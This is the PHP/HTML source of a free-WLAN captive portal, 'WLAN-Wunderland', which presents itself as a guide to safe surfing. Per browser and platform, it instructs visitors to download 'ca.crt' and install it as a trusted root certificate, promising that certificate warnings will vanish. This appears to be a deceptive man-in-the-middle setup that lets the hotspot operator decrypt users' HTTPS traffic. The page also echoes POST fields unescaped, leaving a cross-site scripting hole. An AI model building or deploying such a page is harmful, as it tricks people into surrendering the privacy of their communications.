<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>WLAN-Wunderland - sicher surfen</title>
<link href="style.css" rel="stylesheet" type="text/css" />
</head>
<body>


<div id="container">
        <!-- header -->
    <div id="header">
            <div id="logo"><a href="#"><span class="blue">WLAN</span> Wunderland</a></div>

    </div>
    <!--end header -->
    <!-- main -->
    <div id="main">
        <div id="content">
        <div id="head_image2">
        </div>
        <div id="text">


          <p><h1>Anleitung</h1></p>
                <p><h2>zum sicheren surfen in unserem Free-WLAN<br /> </h2><hr>

				<?php
				
				
				include 'Browser.php';
				$browser = new Browser();
				
				
				if($browser->getBrowser() == Browser::BROWSER_FIREFOX ||
				$browser->getBrowser() == Browser::BROWSER_ICEWEASEL)
				{
					firefox();
				}
				else if ($browser->getPlatform()==Browser::PLATFORM_ANDROID)
				{
					android();
				}
				else if ($browser->getPlatform() == Browser::PLATFORM_IPAD ||
						$browser->getPlatform() == Browser::PLATFORM_IPOD ||
						$browser->getPlatform() == Browser::PLATFORM_IPHONE)
				{
					apple();
				}
				else if ($browser->getBrowser() == Browser::BROWSER_IE)
				{
					ie();
				}
				else
				{
					standard($browser->getBrowser(),$browser->getPlatform());
				}
				
				
				
				?>
                

			
			<form method="post" action="/redirect.php" name="fire_form">
			<input name="b64redirurl" type="hidden" value=<?php echo $_POST["b64redirurl"]; ?>>
			<input name="mac" type="hidden" value="<?php echo $_POST["mac"]; ?>">
			<input name="fire" type="submit" value="zum Internet" onclick="javascript:alert('Sollten Sie nicht automatisch weitergeleitet werden geben Sie Ihre Zielseite von Hand im Browser ein')">
			</form>

                <p><br /><br /></p>

         </div><!-- end text -->
	</div><!-- end content -->
    </div><!-- end main -->




    <!-- footer -->
    <div id="footer">
		<div id="left_footer">&copy; Copyright 2015 MEST-Design
		</div>
		<div id="right_footer">
		</div>
    
	</div><!-- end footer -->


</body>
</html>

<?php
	function android()
	{
		?>
		<span class="help">
		<p>
		Bitte klicken Sie, um unser Sicherheitszertifikat zu installieren auf:
		<form action="ca.crt" style="inherit">
			<input name="Zert" type="submit" value="Zertifikat installieren " style="font-size: 14px">
		</form>
		<br /><br />
		
		Danach erhalten Sie unter Android die Meldung.<br /><br />
        <img src="images/zert_and.jpg"> <br /><br />
        Der <b>Zertifikatsname</b> ist frei w&auml;hlbar, z.B. Wunderland. Unter <b>Verwendet f&uuml;r</b> muß WLAN ausgewählt und dann mit <b>"OK" </b> best&auml;tigt werden.<br>
        <br>
        <hr>
        <br>
        <br>
		Nach Abschluss der Installation, k&ouml;nnen sie mit dem Button "zum Internet" surfen.
		<br>
        </p>
        </span>
        <?php
	}
	
	function apple()
	{
		?>
		<span class="help">
		<p>
		Bitte klicken Sie, um unser Sicherheitszertifikat zu installieren auf:
		<form action="ca.crt" style="inherit">
			<input name="Zert" type="submit" value="Zertifikat installieren " style="font-size: 14px">
		</form>
		<br>
		<br>
		Danach erhalten Sie unter IOS folgende Meldung. Diese bitte mit <b>Installieren</b> best&auml;tigen<br /><br />
        <img src="images/zert_ios1.png"> <br />
        <br />
        <hr>
        <br>
        Im n&auml;chsten Fenster w&auml;hlen Sie bitte erst das <b>Installieren</b> oben rechts und danach das unten erscheinende <b>Installieren</b> aus.<br />
        <br />
        <img src="images/zert_ios3.png">
        <br />
        <br />
		<hr>
		<br>
        Das nun folgende Fenster muss noch mit <b>Fertig</b> best&auml;tigt werden.<br /><br />
        <img src="images/zert_ios4.png"><br />
        <br>
		Nach Abschluss der Installation, k&ouml;nnen sie mit dem Button "zum Internet" surfen.
		<br>
		</p>
        </span>
         <?php
	}
	
	function standard($strBrowser, $strPlatform)
	{
		?>
		<p><h3> 
		<form action="ca.crt" >
			Bitte klicken Sie auf 
			<input name="Zert" type="submit" value="Zertifikat installieren ">
			, um unser Sicherheitszertifikat zu installieren.
		</form>
		<br /><br />
        
                Eine Installationsanleitung für ihren Browser (
                <?php echo $strBrowser . " unter " . $strPlatform ?>
                ) steht nicht bereit.<br /><br>
                Folgen sie den Anweisungen Ihres Ger&auml;tes zur Zertifikatsinstallation. Nach Abschluss
                der Installation, k&ouml;nnen sie mit dem Button "zum Internet" surfen.
        </h3></p>
		<?php
	}
	
	function ie()
	{
		?>
		<h3>Internet Explorer</h3>
		<p>
			Beim Besuchen einiger Webseiten wird im Microsoft Internet Explorer eine Warnung angezeigt, dass ein Problem mit dem Sicherheitszertifikat der Website vorliegt. Befolgen Sie zur Behebung die unten beschriebenen Anweisungen.
		</p>
		<ol>
			<li>
				<p>
					<form action="ca.crt" >
						Bitte klicken Sie auf
						<input name="Zert" type="submit" value="Zertifikat installieren ">
						um unser Sicherheitszertifikat zu installieren.
					</form>
				</p>
			</li>
			<li>
				<p>
					Im Dialogfeld Öffnen oder Speichern klicken Sie auf <span class="fett">Öffnen</span>.
				</p>
				<p>
					Nach der Meldung "Der Download wurde abgeschlossen" klicken sie erneut auf <span class="fett">Öffnen</span>.
				</p>
			</li>
			<li>
				<p>
					In einem neuen Fenster werden Informationen zum Zertifikat angezeigt.
				</p>
			</li>
			<li>
				<p>
					Lesen Sie die Zertifikatdetails, und stellen Sie sicher, dass es sich um das Zertifikat für <span class="fett">wunderland.de</span> handelt.
				</p>
			</li>
			<li>
				<p>
					Klicken Sie auf der Registerkarte <span class="fett">Allgemein</span> auf <span class="fett">Zertifikat installieren</span>.
				</p>
			</li>
			<li>
				<p>
					Klicken Sie auf der ersten Seite des <span class="fett">Zertifikatimport-Assistenten</span> auf <span class="fett">Weiter</span>.
				</p>
			</li>
			<li>
				<p>
					Wählen Sie auf der Seite <span class="fett">Zertifikatspeicher</span> die Option <span class="fett">Alle Zertifikate in folgendem Speicher speichern</span> aus, und klicken Sie auf <span class="fett">Durchsuchen</span>.
				</p>
			</li>
			<li>
				<p>
					Wählen Sie <span class="fett">Vertrauenswürdige Stammzertifizierungsstellen</span> als Zertifikatspeicher aus.
				</p>
			</li>
			<li>
				<p>
					Klicken Sie auf <span class="fett">OK</span>, dann auf <span class="fett">Weiter</span> und im Popup-Bestätigungsfenster auf <span class="fett">OK</span>. Klicken Sie dann auf der letzten Seite des Assistenten auf <span class="fett">Fertig stellen</span>.
				</p>
			</li>
		</ol>
		<p">
			Wenn Sie das nächste Mal eine Seite aufrufen, wird im Internet Explorer keine Warnung über das Zertifikat der Website mehr angezeigt. Die Adressleiste wird nicht mehr rot dargestellt, und auf der Sicherheitsstatusleiste wird ein Schlosssymbol angezeigt, das für eine sichere Kommunikation steht.
		</p>
		<br>
		Nach Abschluss der Installation, k&ouml;nnen sie mit dem Button "zum Internet" surfen.
		<br> 
		<?php
	}
	
	function firefox()
	{
		?>
		<p><h3>
			<form action="ca.crt" >
				Bitte klicken Sie auf 
				<input name="Zert" type="submit" value="Zertifikat installieren ">
				, um unser Sicherheitszertifikat zu installieren.
			</form>
			<br>
			<br>
			Danach erhalten Sie folgende Meldung:<br>
			<br>
			<img src="images/screen.jpg">
			<br>
			<br>
			Hier bitte wie angezeigt die beiden ersten K&auml;stchen aktivieren und mit <b>"OK" </b> best&auml;tigen.<br>
			<br>
			<hr>
			<br>
			<br>
			Sie k&ouml;nnen sich auch das zu installierende Sicherheitszertifikat anschauen, indem Sie auf <b>"Ansicht" </b>klicken.<br>
			Hier bitte darauf achten, dass dieses Zertifikat von uns ausgestellt wurde (siehe Bild).<br>
			<br>
			<img src="images/zert.jpg"> 
			<br>
			<br>
			Nach Abschluss der Installation, k&ouml;nnen sie mit dem Button "zum Internet" surfen.
			<br>
			<br>
        </h3></p>
		<?php
	}
?>
